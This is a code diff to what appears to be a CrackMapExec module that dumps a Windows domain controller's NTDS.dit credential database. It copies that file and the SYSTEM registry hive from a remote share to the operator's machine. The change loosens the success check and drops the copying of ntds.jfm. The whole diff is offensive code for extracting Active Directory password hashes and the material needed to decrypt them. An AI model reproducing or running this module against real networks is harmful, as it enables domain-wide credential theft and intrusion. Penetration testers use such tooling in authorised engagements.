@@ -37,7 +37,7 @@ class CMEModule:
         context.log.debug('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
-        if 'IFM media created successfully' in p:
+        if 'success' in p:
             context.log.success("NTDS.dit dumped to %s%s" % (self.tmp_dir, self.dump_location))
         else:
             context.log.error("Error while dumping NTDS")
@@ -56,14 +56,6 @@ class CMEModule:
                 context.log.debug('Copied ntds.dit file')
             except Exception as e:
                 context.log.error('Error while get ntds.dit file: {}'.format(e))
-
-        context.log.debug('Copy ntds.jfm to host')
-        with open(os.path.join(self.dir_result,'Active Directory','ntds.jfm'), 'wb+') as dump_file:
-            try:
-                connection.conn.getFile(self.share, self.tmp_share + 'Active Directory\\ntds.jfm', dump_file.write)
-                context.log.debug('Copied ntds.jfm file')
-            except Exception as e:
-                context.log.error('Error while get ntds.jfm file: {}'.format(e))
 
         context.log.debug('Copy SYSTEM to host')
         with open(os.path.join(self.dir_result,'registry','SYSTEM'), 'wb+') as dump_file:
